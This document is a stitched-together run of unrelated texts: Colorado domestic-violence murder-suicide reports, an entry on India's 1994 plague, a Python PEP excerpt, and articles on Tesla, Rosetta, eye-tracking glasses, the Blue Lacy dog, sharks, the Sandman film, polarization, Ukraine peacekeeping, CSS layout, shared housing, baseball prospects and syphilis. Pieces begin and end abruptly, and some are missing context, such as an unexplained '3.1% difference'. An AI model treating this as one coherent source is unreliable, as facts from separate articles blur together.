On the morning of April 30, police responded to Jared Haley's home on a report of a shooting. Police found the divorced couple dead, both with gunshot wounds, with at least three children present in the home.
Inside the bedroom where the couple died, a police report shows officers found a list of pros and cons about moving back in together.
Relatives told police Jared Haley had discussed suicide, had a bad temper, and had grabbed his gun during a prior argument. Jared Haley reportedly made a comment to a relative that “If I take myself out, I won't be going alone.” A neighbor told police Jessie Haley was upset with her estranged husband because he had recently gotten a concealed carry permit. Neighbors told police the couple argued often. Court records indicate their divorce case closed about a month before the murder-suicide.
Police records show at least five prior visits to the home. Jared Haley has no Colorado arrest history.
June 28, 2016 – Downtown Denver
Victim: Cara Russell
Suspect: Mickey Russell
Murder weapon: Gun
History: At least 3 prior calls to Buena Vista Police
Reports of an armed man opening fire in downtown Denver's Alliance Center sparked an active shooter scare as employees ran from the building to safety.
Police soon discovered two people with gunshot wounds: Mickey Russell was dead, his estranged wife Cara Russell was gravely wounded.
Cara Russell, the former mayor of the small mountain town of Buena Vista, died the next day. She had recently filed for divorce and moved to Denver to start a new career as the executive director of a nonprofit organization.
Police records show police responded to the couple's home in Buena Vista twice in previous years for domestic disputes. In each case, both husband and wife told police the other had been abusive. In one case, police arrested Cara Russell after her husband accused her of trying to stab him with a pitchfork. She said she did it in self-defense. Mickey Russell was never arrested.
Public records show strong warning signs about Mickey Russell's well-being in the weeks leading up to the murder-suicide. A police report says Lake County law enforcement “almost had to deploy the SWAT team” because of Russell's suicidal threats in May. A police report says he was hospitalized at least twice for threatening suicide. In one incident 16 days before the murder-suicide, the Buena Vista police report says Mickey Russell threatened to punch a police officer in hopes the officer would shoot and kill him. That call led to a 72-hour mental health hold. Buena Vista police also made a report with the FAA and banned Russell, a pilot, from using the local airport out of concern over his suicidal behavior.
Police said after the murder-suicide they did not know where and when Mickey Russell got the gun used to murder his wife.
The Denver police investigation of the murder-suicide is still ongoing.
July 31, 2016 -- Denver
Denver police responded to two separate murder-suicides in one day.
Officers said they found responded to an address on South Harlan Street on a report of a suicide. Inside, police found Sheryl Fierro and Jose Fierro-Renteria shot to death. The medical examiner ruled Sheryl Fierro's death a homicide and Fierro-Renteria's death a suicide.
The same day, police discovered 26-year old Santy Orozco-Uribe murdered at a home on South Knox Court. Police believe Jose Ibarra-Corral killed her before killing himself. Neighbors on the scene told Denver7 two children lived in the home with the couple.
Little has been released publicly about these cases but Denver police did say both stemmed from domestic violence.
The police investigations into both murder-suicides are still ongoing.

The 1994 plague in India was an outbreak of bubonic and pneumonic plague in south-central and southwestern India from 26 August to 18 October 1994.[1] 693 suspected cases and 56 deaths were reported from the five affected Indian states as well as the Union Territory of New Delhi. These cases were from Maharashtra (488 cases), Gujarat (77 cases), Karnataka (46 cases), Uttar Pradesh (10 cases), Madhya Pradesh (4 cases) and New Delhi (68 cases). There are no reports of cases being imported to other countries.[1]
Initial reports [ edit ]
In the first week of August 1994 health officials reported unusually large numbers of deaths of domestic rats in Surat city of Gujarat state. On 21 September 1994 the Deputy Municipal Commissioner of Health (DMCH) for Surat city received a report that a patient had died seemingly due to pneumonic plague. The DMCH of Surat alerted medical officers in the area where the patient had died. Later that day, a worried caller informed DMCH about 10 deaths in Ved Road residential area and around 50 seriously ill patients admitted to the hospital. This triggered the biggest post-independence migration of people in India with around 300,000 people leaving Surat city in 2 days.[2][3]
Outbreak of disease and panic [ edit ]
News of the Plague spread through Surat city through the night of 21 September 1994. Ill-prepared, medical shops quickly exhausted stocks of tetracycline.[4] This led to panic with people fleeing hospitals fearing infection from other sick patients.[4]
Due to the migration of infected people from Surat city, suspected plague spread to five states. A total of around 52 deaths were reported from India due to this suspected plague outbreak.[4]
Over the course of this event, many flights from India to the nearby Gulf region were suspended. Some countries also put a hold on the imports from India.
Surat [ edit ]
The epicenter of the plague was Surat, Gujarat. 52 people lost their lives and close to a quarter of the city's citizens fled the area for fear of being quarantined. Although the plague only lasted a little over two weeks, it caused widespread panic. Tourism was negatively affected, flights to India were cancelled, and some planes from India were fumigated at airports.[2][5]
Large scale flooding occurred due to the heavy rain and clogged sewers. This caused dead animals to remain out in the open, which added to the already unhygienic conditions.[6] Many people were afraid that the refugees would disperse the plague and potentially spread it around the world, but this never happened probably because of the efficient response by the Indian health authorities.[7]
Much like the Black Death that spread through medieval Europe, some questions still remain unanswered about the 1994 epidemic in Surat.[8] Initial questions about whether it was an epidemic of plague arose because the Indian health authorities were unable to culture Yersinia pestis, but this could have been due to lack of sophisticated laboratory equipment.[8] Yet there are several lines of evidence strongly suggesting that it was a plague epidemic: blood tests for Yersinia were positive, a number of individuals showed antibodies against Yersinia and the clinical symptoms displayed by the affected were all consistent with the disease being plague.[9]
Cause [ edit ]
A committee under chairmanship of Professor Vulimiri Ramalingaswami was formed by the Government of India to investigate the plague episode. In 1995 the committee submitted the report 'The Plague Epidemic of 1994' to the Government of India. The report concluded that the disease was plague. [10][11] Also the origin of disease could not be traced. Within a few weeks the spread of disease and panic ended. Nevertheless, this 1994 plague episode in India is remembered for the panic it caused, both in India and in the international community.[8]

This PEP proposes a way to protect Python code from being interrupted inside a final clause or during context manager cleanup.
Further exploration of the concepts covered in this PEP has been deferred for lack of a current champion interested in promoting the goals of the PEP and collecting and incorporating feedback, and with sufficient available time to do so effectively.
Python has two nice ways to do cleanup. One is a final statement and the other is a context manager (usually called using a with statement). However, neither is protected from interruption by KeyboardInterrupt nor GeneratorExit caused by generator.throw() . For example:
lock.acquire() try: print('starting') do_something() finally: print('finished') lock.release()
If KeyboardInterrupt occurs just after the second print() call, the lock will not be released. Similarly, the following code using the with statement is affected:
from threading import Lock class MyLock: def __init__(self): self._lock_impl = Lock() def __enter__(self): self._lock_impl.acquire() print("LOCKED") def __exit__(self): print("UNLOCKING") self._lock_impl.release() lock = MyLock() with lock: do_something
If KeyboardInterrupt occurs near any of the print() calls, the lock will never be released.

What is a Dojo anyway?
The Japanese word Dojo commonly refers to a place, school or training hall where Martial Arts training takes place. Literally, Dojo means Way place, as in: a place where certain way or style of Martial Art Training takes place.
Because most popular Martial Arts Styles, including Karate, Aikido, Judo, Jujitsu, Kendo etc. are of Japanese origin, the term Dojo is familiar to most Martial Artists.
The Korean equivalent for Dojo is Dojang and chinese equivalent is Kwoon.
Sam Altman of Y Combinator recently had the opportunity to have a 1-on-1 sit down with Elon Musk. During the interview, they conversed about various subjects including whether or not he [Musk] thought people getting their PhDs is generally useful, the colonization of mars, and artificial intelligence. But one statement, in particular, that Musk revealed in his talks with Altman stood out like a sore thumb: he believes that the team at Tesla can increase the speed on the production line by, a staggering, 20-fold.
In recent months, Musk started comparing Tesla's future factory to an “alien dreadnought”, adding “the point at which that's what the factory looks like, that's when you know you've won.”
Earlier this year, he explained that his new focus is on “the machine building the machine.” Applying physics first principle, he turned manufacturing into an equation: “the output is going to be volume times density times velocity.”
He has since been talking a lot about the output of Tesla manufacturing plants in terms of speed. For example, this is how he described the future battery cell manufacturing output at the Gigafactory:
“The exit rate of cells from Gigafactory will be faster than bullets from a machine gun.”
Now towards the end of the conversation with Sam Altman published today, in reference to the automated robots at the Fremont factory, they started talking about the speed of the factory output:
Sam: It's amazing to watch the robots go here and these cars just happen. Elon: Yeah. Now, this actually has a relatively lower level of automation compared to what the Gigafactory will have and what Model 3 will have. Sam: What's the speed on the line of these cars? Elon: Actually our speed on the line is incredibly slow. I think we are…in terms of the extra velocity of vehicles on the line, it's probably about, including both X an S, it's maybe five centimeters per second. This is very slow. Sam: And what would you like to get to? Elon: I'm confident we can get to at least one meter per second. So, a 20-fold increase. Sam: That would be very fast. Elon: Yeah. At least. I mean, I think quite a…one meter per second, just to put into perspective, is a slow walk or a medium-speed walk. A fast walk could be one and a half meters per second. And then the fastest humans can run over 10 meters per second.
To put things into perspective, Tesla is currently producing about 2000+ vehicles per week at the production speed of ~5 centimeters per second on the line. If they get to the point where they're moving cars down the line one meter per second, we can only imagine how many vehicles they'll be pushing out. We do know that they are trying to get to levels of producing ~10,000 vehicles per week by 2018, so increasing their speed and efficiency by 20-fold is definitely one way to do it.
In addition to further developing their efficiency, reaching this speed on the line will assist Tesla in keeping up with the insane demand for the Model 3.
You can check out the interview down below:
This in an incredibly bold statement. A 20-fold increase?What do you think? Let us know in the comment section below.
yay! i finally got a finished illustration done! it's been awhile since i've done one outside of work.so here she is, a female warrior that's not showing her boobies!!i was basically going for a simple piece showing off the character. i've always had a hard time not showing every part of the figure, but after re-studying Frazetta for a bit i realized that he rarely shows feet. their usually blended into the environment or obstructed by something.if he were a lesser artist, i would have written it off as lazyness or a lack of skill, but i think it really helps to ground the figure and make them part of the environment.did you feel that? we just had a moment...overall I'm pretty happy with this piece. there's nothing mind blowing about it, but i feel like it's a simple and solid illustration.let me know what you guys think!hurray! now I'll have some confidence again for a few days (until i start the next drawing).---------------------------------------------------------------------------update: This image was purchased for the card game Untold.

Rosetta Spacecraft Arrives At Comet After 10-Year Chase
After a decade of travel, the European Space Agency's Rosetta spacecraft arrived at a comet early this morning.
"Ten years we've been waiting in the car to get to scientific Disneyland," ESA's Mark McCaughrean said. "It's a wonderful moment."
The comet, called 67P/Churyumov–Gerasimenko, orbits the sun once every six years or so. It's an unusual shape — some say it looks like a rubber duck, others like the spaceship "Serenity" from the sci-fi series Firefly.
Rosetta will now stay with the comet as it travels around the sun. The spacecraft's scientific instruments will be used to probe everything from the dust thrown up by the comet, to its internal structure.
In November, Rosetta will release a lander about the size of a small refrigerator. The lander will float down to the comet's surface and attempt to secure itself using harpoons. Harpooning a comet would be a first for humanity.
Ultimately, researchers say studying comet 67P should teach them more about the origins of the solar system. Comets are thought to be leftover raw ingredients from when our sun and the planets formed. They may even have brought the water in Earth's oceans — seeding the planet for the birth of life itself.
Here's a look at the long and circuitous route Rosetta took to arrive at its destination:
Your devices already track your location and communication — why not what you're looking at, too? That's the promise of the Tobii Glasses 2, a pair of high-tech glasses that can track your eyes.
Why would you ever want to do such a thing? You probably wouldn't, but researchers of visual systems are clamoring for that kind of information — what, for instance, a person spends the most time looking at when they're watching TV while holding a tablet.
See also: 9 Top Tech Breakthroughs of 2013
The glasses are designed primarily for those kinds of scenarios: research projects, testing rooms and simulators — where the thing being looked at isn't just a computer or tablet screen, which would be better served by non-wearable eye tracking like Tobii's EyeX. If you want to study what part of a person's face people look at in various social situations, for example, the Tobii Glasses 2 can tell you.
"What you're actually watching is the overlay of the gaze on the video," explains Barbara Barclay, general manager of Tobii North America. "The glasses themselves have no obstruction on the peripheral, so [they] can eye-track a wide area."
Although Tobii has had an eye-tracking pair of smart glasses for a while, the Tobii Glasses 2 has some nice upgrades. Each eye is now tracked by two cameras, which means even if the wearer adjust the glasses a little, they'll have a better chance of tracking your gaze. At 1.6 ounces, they're also extremely light.
The best part of the upgrade is real-time tracking. A researcher can watch what a person's looking at — with the gaze point continuously market onscreen — on a tablet or laptop as they're looking at it, the footage transmitted wirelessly from the glasses. The device also saves the footage to an SD card.
And what about when it comes time to analyze all this valuable eye-tracking data? Tobii can help there, too, but to get serious analysis software, you're going to have to pay extra. The basic Live View version of the Tobii Glasses 2 costs $14,900, but the Premium Analytics package is $29,900.
That's well north of even the notoriously expensive Google Glass, but if you're in the market for wearable eye tracking, there aren't that many games in town (although Berlin-based SMI offers an alternative). Tobii also offers the Premium Analytics package as a subscription for $800 a month.

Tobii plans to open up the Glasses 2, and the software that powers them, to developers later this year, with an SDK coming in October. That will allow manufacturers to integrate Tobii's platform into their own wearables, which could eventually lead to augmented-reality gaming headsets and smart glasses that can display information about exactly what you're looking at.
"That will allow people who are doing more complex interactions to take the platform of the glasses and do all kinds of things," says Barclay.
Tobii builds several different kinds of eye-tracking technology. The company just began shipping the EyeX, an eye tracker intended for PCs, to developers.

Texas Blue Lacy
Lacy Hog Dog
Lacy Cur[1] Origin United States Breed status Not recognized as a standardized breed by any major kennel club. Traits Weight Male 16 to 23 kg (35 to 50 lb) Female 11 to 20 kg (25 to 45 lb) Height 46 to 53 cm (18 to 21 in) Coat smooth Color blue, red, tricolored Notes State dog of Texas Domestic dog Canis lupus familiaris )
The Lacy Dog or Blue Lacy Dog[2] is a breed of working dog that originated in Texas in the mid-19th century.[3] The Lacy was first recognized in 2001 by the Texas Senate. In Senate Resolution No. 436, the 77th Legislature honored the Lacy as "a true Texas breed". In June 2005, Governor Rick Perry signed the legislation adopting the Blue Lacy as "the official State Dog Breed of Texas".[3] As expected, the vast majority of Lacy dogs are found in Texas. However, as the breed becomes more well recognized, there are breeding populations being established across the United States, Canada, and most recently in Europe.
Description [ edit ]
Appearance [ edit ]
Lacy dogs are strong and fast, lightly built but proportional within the height-to-weight ratio. Height at the withers is from 43 to 56 cm (17 to 22 in). Dependent on height and general conditioning, weight should be approximately 11 to 20 kg (25 to 45 lb) for females and 16 to 25 kg (35 to 55 lb) for males.[2] The standards listed in the Texas House Concurrent Resolution No. 108 are slightly different: height between 46 to 64 cm (18 to 25 in), weight between 14 to 23 kg (30 to 50 lb) but it was not until 2005 that it was officially recognized as the state dog.[3]
Color [ edit ]
Though they are often called "blue" Lacys, there are three permissible color varieties of the Lacy. "Blues" are any shade of gray from light silver to dark charcoal. "Reds" range from light cream to rust. The "Tri" combines a blue base with distinct red markings as appropriate for trim, and white which may appear on the brisket and stretch from chin to groin. White may also be present on one or more paws. Excessive white is discouraged, and markings on the face or above mid-line are a disqualifying fault. Their eyes are sharp and alert, ranging in color from bright yellow to rich amber.[2]
Coat [ edit ]
The coat should be short, smooth and tight. An excessively long or rough coat is a disqualification. Lacys shed, but require minimal grooming.
Temperament [ edit ]
Blue and Tan Lacy
Blue Lacy Dogs in general are intelligent, intense, active, and alert. Developed to be both hunting and herding dogs, they display great drive and determination to work with big game and control difficult livestock. Young dogs may have too much energy and drive for small children. They are easy to train, learning new skills quickly.
Activities [ edit ]
The Lacy is a working breed, and does much better when given a job, which allows them to burn off excessive energy. Work they excel at includes herding livestock,[4] blood trailing or tracking,[5] treeing game, running trap lines,[6] and hunting wild hogs.[7] Modern activities like agility that stress intelligence, passion, speed and nimbleness may be appropriate substitutes for traditional work.[8] Herding instincts and trainability can be measured at noncompetitive herding tests. Lacys generally exhibit herding instincts and can be trained to compete in stock dog trials or hog bays.[9] During recent years, Lacy dogs have also become recognized for their great tracking skills, and sought after to be used to locate "lost" game animals. Besides, they're used by United States trappers for save and chasing operation.
Health [ edit ]
Lacys are generally very healthy dogs. Developed for generations to meet the requirements of ranchers and hunters, they are sturdy enough to withstand tough terrain, difficult working conditions, and both hot and cold weather by Texan standards. However, skin problems and food allergies can occur. Color dilution alopecia is very rare but has occurred in Lacys.[10]
History [ edit ]
Red Lacy puppy
The Lacy dog was named after the Lacy brothers (Frank, George, Ewin, and Harry Lacy) who moved from Kentucky to Texas in 1858, settling in Burnet County, Texas.[3] The dog, according to the Lacy family, was a mixture of English Shepherd (or perhaps coyote), greyhound, and wolf.[11] Texas House Concurrent Resolution No. 108 also mentions scenthound.[3] The brothers originally developed the dogs' natural herding instincts to work the family's free-roaming hogs.[12]
On March 15, 2005, in the 79th Legislature of the State of Texas, Representative Joaquin Castro at the request of the Texas Lacy Game Dog Association filed House Concurrent Resolution No. 108, proposing the blue Lacy as state dog of Texas. This legislation was proposed to recognize the original breeders and their contribution to the State of Texas as well as to honor the Lacy as a Texas original. House Concurrent Resolution No. 108 was adopted by the Texas House of Representatives on May 15, 2005, and by the Senate ten days later on May 25, 2005. Governor Rick Perry signed the legislation adopting the Lacy as "the official State Dog Breed of Texas" on June 18, 2005.[3]
The Lacy was proposed by some in 2008 to replace Reveille VII, a collie, as the mascot dog of Texas A&M.[13] In accordance with tradition since Reveille III, however, a collie was chosen.
In clear footage shot above and below the water, paddleboarders in Southern California recorded a recent encounter with a group of juvenile great white sharks just off a popular beach.
Shot on June 26 at Sunset Beach in Orange County, the video was made by Courtney Hemerick and Joseph Truckles, who remained calm through the experience.
“I think where these guys were and what they were doing was probably fine,” says Gregory Skomal , a senior marine fisheries scientist and shark expert with the state of Massachusetts.
The 7-foot (2-meter) long sharks are juvenile great whites, which often congregate in protected bays and right off the surf zone along both U.S. coasts, particularly in California. The juveniles eat mostly fish, though they sometimes scavenge dead carcasses. When they grow up they become top predators, reaching sizes of up to 20 feet (6 meters) long and weights of up to 5,000 pounds (2,268 kilograms). The adult fish dine on other sharks, seals, dolphins, and whatever else they can catch.
Watch paddleboarders surrounded by juvenile great white sharks in California in late June.
“The sharks in the video are probably checking the paddlers out, with a level of curiosity but also a level of caution because they don't know what they are looking at,” says Skomal. ( Learn about shark attacks on the rise in North Carolina .)
Since the animals often do feast on floating carcasses, they might have initially been attracted to the shapes at the surface. But such sharks “are very unlikely to bite,” says Skomal.
Such juveniles haven't developed the skills for attacking larger prey. Adult great whites, on the other hand, are known to occasionally bite surfers and surfboards , exercising their roles as top predators in the ocean. One third to a half of all shark attacks are attributed to great whites. For this reason, experts recommend against swimming or paddling near seal colonies, where adult great whites sometimes congregate.
Although sharks are rapidly declining around the world due to fishing and pollution, great whites appear to be making a slow comeback in North American waters, thanks to legal protections. These kinds of encounters are likely to increase, says Skomal, especially as more people have access to video cameras and even drones ( which recently recorded great whites off a California beach ).
It's important to remember that the ocean is sharks' natural habitat and people should never harass them, both for their safety and the safety of the animals, Skomal adds.
Joseph Gordon-Levitt has backed out of the planned Sandman movie, three years after he helped to get a film version of Neil Gaiman's classic comic greenlit. In a Facebook post this weekend, the actor said he made the decision to walk away from the movie after he realized that he and studio New Line Cinema "just don't see eye to eye on what makes Sandman special, and what a film adaptation could/should be."
Sandman appeared to be a passion project for Gordon-Levitt, who first confirmed he'd be producing an adaptation in 2013, and was long rumored to be taking a starring role. The project was initially underway at Warner Bros., but Sandman— like all properties from DC Comics' Vertigo imprint — was shuffled down to New Line Cinema last year, a change that seems to have caused some creative friction.
RE: SANDMANSo, as you might know if you like to follow these sorts of things, a while back, David Goyer and I made a... Posted by Joseph Gordon-Levitt on Saturday, 5 March 2016
Gordon-Levitt's departure comes a day after it was announced that Final Destination 5 writer Eric Hesserling would be writing the script for Sandman's movie adaptation. It's not clear whether this move prompted Gordon-Levitt's decision, but Hesserling replaced Jack Thorne, chosen for the same role by Gordon-Levitt and colleagues in 2014, and name-checked as an "excellent screenwriter" in the actor's Facebook post. Neil Gaiman is given special mention in the same post, Gordon-Levitt thanking Sandman's writer for his "generous insights and masterful work."
Gaiman returned the favor in a tweet, calling Gordon-Levitt "special," but made it clear to fans that he doesn't own Sandman and can't choose scriptwriters, cast, or crew. Production continues on the movie, but with its most visible cheerleader gone and its creator making it clear that he can't guarantee it'll be any good, the future could be a nightmare for fans of Gaiman's Dream.
There are lots of reasons American politics went off the rails, but Axios CEO Jim VandeHei breaks out six seminal events in the past 24 years that steered us here:
Newt Gingrich, in the early 1990s, weaponized warfare politics in a methodical and sustained way. In tactics and rhetoric, Gingrich ushered in a good-vs.-evil style that persists today. Fox News, created in 1996, televised and monetized this hard-edged combat politics. This created the template for MSNBC to do the same on the left, giving both sides a place to fuel and fund rage 24/7. CNN soon went heavy on politics, all day, making governance a show in need of drama. Facebook and later Twitter, both products of the post-2000 Internet revolution, socialized rage and argument. Now every nut with an opinion could find fans and followers to cheer/egg him or her on. This happened as the middle in politics was officially purged from Congress. John McCain picking Sarah Palin as his running mate in 2008 celebritized rage politics. Until that moment, Republicans typically picked conventional, next-in-line candidates. Palin, made for cable and social media, was the precursor to Trump. Facebook, with command of so much of most voters' time and attention, algorithm-ized rage starting around 2015. The more emotion you felt and sought, the more the newsfeed machine pumped at you. With no one looking, fake news was born and metastasizing. Twitter + Trump, igniting in 2016, habitualized and radicalized the moment-by-moment rage and reaction of politicians, voters and the media. This created more froth and more fog, and resulted in a spike of people who don't believe real news, much less the fake news pulsing through the system.
Now, all of this has been institutionalized. No wonder people don't trust, like or believe politicians — or often each other.
Fun fact: A Pew poll on partisanship found Republicans and Democrats no longer even want to live near each other.
75% of conservatives want to live where "houses are larger and farther apart, but schools, stores, and restaurants are several miles away."
of conservatives want to live where "houses are larger and farther apart, but schools, stores, and restaurants are several miles away." 75% of liberals want to live where "houses are smaller and closer to each other, but schools, stores, and restaurants are within walking distance."
Sound smart: Politics is growing more personal, polarized and pugnacious. This dynamic is particularly acute on the right. This will likely get worse before it gets better as these trends gain more momentum.
The Trudeau government is facing increasing pressure to take a leadership role in war-torn eastern Ukraine by spearheading a UN peacekeeping mission to help stabilize the conflict between Kiev and Russian-backed belligerents.
Growing support within Canada for such a deployment comes as the Liberals prepare to unveil a pledge to commit troops to United Nations peace support missions. Their plans are still confidential.
Official Opposition Leader Andrew Scheer is joining the call of a Ukrainian-Canadian lobby group in endorsing the idea of a Ukraine mission led by Canada. He will use a news conference Thursday to urge Ottawa to blaze the way for this deployment. A UN mission would nevertheless need to be approved by the United Nations Security Council, whose members include Russia.

For subscribers: Ukraine's prime minister seeks to change his country's narrative in Canada
More than 1.3 million Canadians, including Foreign Affairs Minister Chrystia Freeland, can trace their heritage to Ukraine, where a three-year-old conflict between the Kiev government and Moscow-supported fighters continues.
A UN peace support mission "would allow Ukraine to restore control over its eastern border with Russia, ensuring the Russian military stays within its own country, and out of Ukraine," Mr. Scheer says in remarks to be delivered Thursday.
His Conservative Party is calling for a peacekeeping mission that would be located at the Ukrainian-Russian border rather than at the front line itself in the Donbass region of eastern Ukraine.
The war in eastern Ukraine – which ignited after Russia annexed Ukraine's Crimean peninsula in early 2014, despite widespread condemnation from the West – has claimed more than 10,200 lives so far.
There is currently no UN-mandated peacekeeping mission in Ukraine. Ukrainian President Petro Poroshenko has urged the UN Security Council to dispatch such a mission. He has also rejected a separate Russian proposal for a peacekeeping mission in the region as an effort to "freeze the conflict" in place.
The Ukrainian Canadian Congress for several months has been calling both privately and publicly for Canada to lead a UN mission in Ukraine.

The lobby group representing Canadians of Ukrainian descent has proposed this in briefings for the federal government and when speaking to MPs. UCC president Paul Grod said this proposal has the support of the Central and Eastern European Council of Canada, groups representing four million Canadians of Central European and Eastern European descent.
In early September, Russian President Vladimir Putin proposed his own version of a peacekeeping mission – which critics called insincere but others suggested might be his attempt to find a way out of the conflict. Mr. Putin called for a peacekeeping force that would be limited to policing the front line of the war and restricted to six months, and focused primarily on protecting monitors from the Organization for Security and Cooperation in Europe (OSCE) who are supposed to be mediating ceasefire efforts.
Eastern Ukraine has been a deadly place since April, 2014, and efforts to broker a stable ceasefire have failed.
Canadian troops would face tremendous danger there unless the arms buildup in the region was scaled back. Shelling, shooting and mines or booby traps have killed scores over three years.
The Office of the United Nations High Commissioner for Human Rights earlier this year said it had tallied up 10,225 deaths and 24,541 injuries in the three years of fighting between April 14, 2014, and Aug. 15, 2017. Those killed or injured include civilians, Ukrainian armed forces as well as members of the other armed groups, the office said.
But established UN peacekeeping missions are deadly, too. The mission in Mali has recorded more than 130 peacekeeper deaths in the past five years.

Earlier this fall, Prime Minister Justin Trudeau voiced support for a potential UN mission in Ukraine, during a visit from Mr. Poroshenko, but stopped short of committing Canadian troops.
In 2016, the Liberals – eager to restore Canada's participation in peacekeeping missions after decades of decline – announced they were setting aside $500-million for such missions and pledged to send 600 soldiers and 150 police officers to UN peace support missions.
The Trudeau government has been silent on commitment since.
The Liberals are expected, however, to announce a peacekeeping pledge shortly as Canada prepares to host a summit on peace support operations in Vancouver starting Nov. 14.
Mr. Scheer, in remarks he will deliver Thursday, says Canadian leadership in a Ukraine peacekeeping mission would be in line with Ottawa's strong support for Kiev over the last three years.
"The defence of Ukraine's sovereignty and territorial integrity should be a priority for Canada's government on the international stage," he says. "Now is the time to act."

Separately, The Canadian Press reports that Academy Award-winning actress Angelina Jolie is expected to lend her star power to next week's peacekeeping summit in Vancouver.
A draft program for the two-day meeting says Ms. Jolie will deliver a keynote address at the event, appearing as a special envoy of the UN High Commissioner for Refugees and co-founder of the Preventing Sexual Violence Initiative.
The other keynote address will be delivered by Patrick Shanahan, the U.S. deputy secretary of defence.
Representatives from 80 countries, including approximately 50 defence ministers, are expected to attend.
The government has reportedly been in talks with UN officials about where to send Canadian peacekeepers; options include sending helicopters to Mali and Haiti, a transport plane to Uganda and troops to the Golan Heights.
With a report from Canadian Press
For many years, craftsman Jesse Horn was frustrated with the direction of the North American firewood industry:
Employees of Vancouver artisanal firewood company, Smoke & Flame, product testing some of their kindling. (CBC)
"Nowadays when people think of firewood they think of it being 'hog-tied' in plastic and sold for $5.99 at gas stations. To me this is wrong and it completely disrespects the wood."
To make things right, Horn started Smoke & Flame - North America's only premium, handcrafted firewood manufacturer. In his tiny shop in Vancouver, BC, he and an apprentice labour over perfect bundles of kindling, twigs, moss, and logs which sell for upwards of $1000 each.
According to Horn, people are not at all shocked by the sticker price: "My customers want to know that they're burning quality and they are happy to pay a little bit more to achieve that."
This Is That sent our cameras to Horn's shop to go behind the scenes at Smoke & Flame and learn how Horn makes his artisanal firewood.
This Is That Season 6 begins September 10, at 11:30am on CBC Radio.
'Layout' is the process a browser undergoes to calculate the position and size of each element in a document before it can start painting pixels. The process of layout can be costly, especially on low powered mobile devices.
As considerate front-end developers, it is our job to keep layouts to minimum to ensure our apps remain snappy.At some point though, layout has to be done. DOM structure changes, changes to dimensions or position of elements, and requests for element position or size via JavaScript, can all trigger layout.
What is not commonly known, is that layouts events have scope. Most of the time a layout forcing change to one small part of your app, will cause the entire document to be reflowed; and this can mean thousands of nodes.
Introducing 'layout boundaries'
With a few small CSS tweaks we are able to enforce layout boundaries in our document. This means that if any layout forcing changes are made inside the scope of a layout boundary element, only a 'partial reflow' is required, and this is a lot cheaper!
To be a layout boundary, the element must:
Be an SVG root ( <svg> ).
). Be a text or search <input> field.
or:
Not be display inline or inline-block
or Not have a percentage height value.
Not have an implicit or auto height value.
height value. Not have an implicit or auto width value.
width value. Have an explicit overflow value ( scroll , auto or hidden ).
, or ). Not be a descendant of a <table> element.
Paul Lewis' Boundarizr tool can be used to highlight which elements in your app are acting as 'layout boundaries'.
Facebook example
To prove my point I have found a layout case on Facebook that could be optimised. When the auto-complete search drop-down is opened we can see in the timeline quite aggressive layout thrashing as elements are inserted and manipulated in the list.
By hovering over the layout event in Chrome Devtools Timeline we can see that the 'Layout scope' is labeled as 'Whole document' (highlighted in blue), the 'Layout tree size' is 2551 nodes, and the 'Duration' is 2.142ms.
Diving into the Elements panel I find a suitable parent node above where the DOM changes are taking place. I set a pixel based height, and set overflow: hidden . The element is already position: absolute , and already has a width set, so I don't have to introduce those changes.
This should enforce a layout boundary to scope the reflow to a much smaller portion of the document.
I now run the same routine and observe the layout events again in the Timeline panel.
When we hover over the layout event we can see the blue highlighted area now only covers our newly promoted 'layout boundary' element. The 'Layout scope' is now labeled as 'partial', the 'Layout tree size' is 228 nodes (91% reduction) and the Duration is 1.255ms (41% reduction).
Is this a micro-optimisation?
In terms of duration per layout event a saving of ~1ms seems pretty negligible, but let's take a few more points into consideration:
This event was one of about 20 similar events that were triggered when the drop-down menu was revealed, and each one gained a similar saving following the CSS tweak. We are profiling this on a high powered MacBook Air within Google Chrome. The speed of layout within this type of environment greatly outperforms that of even the most performant mobile devices. If we are reducing layout time by 40%, the gains on devices that are slower at layout could be significant. This particular layout is relatively simple. Within a more complex (flexbox, tables, floats, etc) layout we would likely see greater gains.
How does this work?
TBH I'm not 100% sure. I would guess that by constraining the size of the parent element and making sure descendent elements cannot flow out of the boundaries by setting overflow: hidden; , layout engine optimise by making the assumption that nodes outside the layout boundary do not have to be checked.
Is this just applicable to Chrome?
TBH I'm not sure, but I would guess that other browser layout engines would make similar optimisations when element style properties permit.
At the time of writing (AFAIK) we don't have the same level of layout profiling available to us within other browser's developer tools.
If there are ways we can measure this inside browsers other than Chrome I would love to hear about it :)
Conclusion
To me this seems like something we should really be considering more in development. If we can make some super quick style changes that enforce layout boundaries, the browser has to do less work, and we get faster layout times.
Try it out in your app and let us know if you are able to make some quick performance gains.
For many people, “doubling up”—moving in with family or friends—is the last step on the way to homelessness. But doubling up has benefits for people and for the planet.
1. Less Poverty
In 2010, that 3.1% difference could have meant 1.4 million people kept out of poverty.
2. Security and Independence for Elders
Consider this: 79 million baby boomers will be entering their elder years in the next two decades. Where will they live? Elders who live with others are healthier, by 15%. For older men, rates of depression are more than double for those living alone (30% vs. 12%).
3. More Sustainable
One of the biggest costs of housing—both monetary and ecological—is heating and cooling. If you put four people in the space that used to be occupied by two, it changes the heating and cooling requirements for that space hardly at all. But it means you're heating and cooling half the space you were before.
Interested?
Since the minor league season ended, I've received dozens of requests for a new prospect list.
Normally I wouldn't do the next list until my book is finished in January. I don't mean to sound like Dayton Moore, but I have a very specific Process developed over the last 15 years to make sure every list is as comprehensive as possible.
For example, integrating 2012 draftees/signees who have small performance records (Buxton, Correa, etc.) is problematic. With my normal Process, I have months to gather and analyze information to get the placement for those guys right. As I write the book, I do an individual analysis for each player (and about 1000 others) to get a letter grade, then do the list and make adjustments once the grades are done.
I haven't even started the grading for 2013 yet, but people want a list now, so here it is. The next version of the list will be finished when the 2013 Baseball Prospect Book goes to press in January. I'm confident in the names here, but the exact rankings, particularly outside the top ten, may look quite different in January compared to what you see here. This list should be understood as a working document.

Syphilis could become impossible to treat with key antibiotics, doctors warn amid concerns over a new drug-resistant strain.
Once a death sentence, the vast majority of syphilis cases today are curable with penicillin injections.
However, a new study reveals an aggressive new strain of the infection is more widespread than previously thought - and there are limited ways to control it.
There are two common types of syphilis: Nichols and Street Strain 14 (SS14).
In an analysis of syphilis samples, researchers by the University of Zurich found the most common to be SS14-Ω, a sub-set of SS14.
Alarmingly, 90 per cent of the SS14-Ω samples they analysed were resistant to antibiotics.
A new study reveals an aggressive new strain of syphilis is more widespread than previously thought - and there are limited means to control it
Although scientists have yet to detect any penicillin-resistant strains, the discovery is an ominous sign that it is adapting to modern medicine.
